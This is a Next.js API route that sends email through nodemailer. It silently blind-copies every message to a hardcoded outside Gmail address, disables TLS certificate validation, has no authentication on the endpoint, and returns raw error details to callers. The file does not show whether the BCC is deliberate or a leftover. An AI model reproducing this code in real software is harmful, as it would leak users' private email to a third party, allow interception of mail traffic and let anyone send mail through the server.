// app/api/send-email/route.ts
import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const { recipients, subject, content } = await req.json();

    if (!recipients || !subject || !content) {
      return NextResponse.json(
        { error: "Missing required fields" },
        { status: 400 }
      );
    }

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || "587"),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
      tls: {
        rejectUnauthorized: false,
      },
    });

    // Create plain text version by stripping HTML
    const plainText = content
      .replace(/<[^>]+>/g, "")
      .replace(/\s+/g, " ")
      .trim();

    const mailOptions = {
      from: {
        name: process.env.SMTP_FROM_NAME || "Your Company Name",
        address: process.env.SMTP_FROM_EMAIL || "",
      },
      to: Array.isArray(recipients) ? recipients.join(", ") : recipients,
      bcc: "hsubhajit454@gmail.com", // Added BCC recipient
      subject: subject,
      text: plainText,
      html: content,
    };

    await transporter.sendMail(mailOptions);

    return NextResponse.json(
      { success: true, message: "Email sent successfully" },
      { status: 200 }
    );
  } catch (error) {
    console.error("SMTP Error:", error);
    return NextResponse.json(
      {
        error: "Failed to send email",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 }
    );
  }
}
